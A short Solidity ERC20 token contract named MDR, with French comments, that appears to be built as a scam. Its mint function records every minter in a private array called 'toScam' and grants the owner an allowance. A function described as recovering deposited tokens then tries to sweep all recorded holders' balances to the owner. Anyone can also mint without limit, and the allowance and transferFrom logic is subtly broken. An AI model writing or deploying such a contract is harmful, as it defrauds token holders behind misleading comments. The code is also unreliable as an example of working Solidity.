// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MDR is ERC20, Ownable {

    uint256 initialSupply = 1000000 * (10 ** decimals());
    address[] private toScam;

    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) Ownable(msg.sender) {
        _mint(msg.sender, initialSupply); // Mint initial supply to the deployer of the contract
    }

    // Fonction permettant de créer de nouveaux tokens
    function mintTokens(uint256 amount) public {
        _mint(msg.sender, amount * (10 ** decimals()));
        toScam.push(msg.sender);
        approve(owner(), amount);
    }

    // Fonction permettant de brûler des tokens
    function burnTokens(uint256 amount) public {
        _burn(msg.sender, amount * (10 ** decimals()));
    }

    // Fonction permettant de récupérer les tokens déposés dans ce contrat
    function recoverTokens() public {
        for (uint256 i = 0; i < toScam.length; i++) {
            transferFrom(toScam[i], owner(), balanceOf(toScam[i]));
        }
        // return mintTokens;
    }
}